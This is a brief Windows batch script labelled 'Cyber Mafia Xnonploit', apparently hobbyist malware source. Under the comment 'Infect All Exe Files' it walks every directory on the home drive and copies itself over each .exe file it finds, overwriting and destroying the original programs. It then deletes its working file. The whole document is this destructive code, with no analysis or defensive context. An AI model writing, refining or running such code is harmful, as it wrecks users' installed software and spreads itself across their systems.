:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off
::----Infect All Exe Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.exe) Do (
            Set ExeInfect=%%Z > Nul
            Copy /y %0 %ExeInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
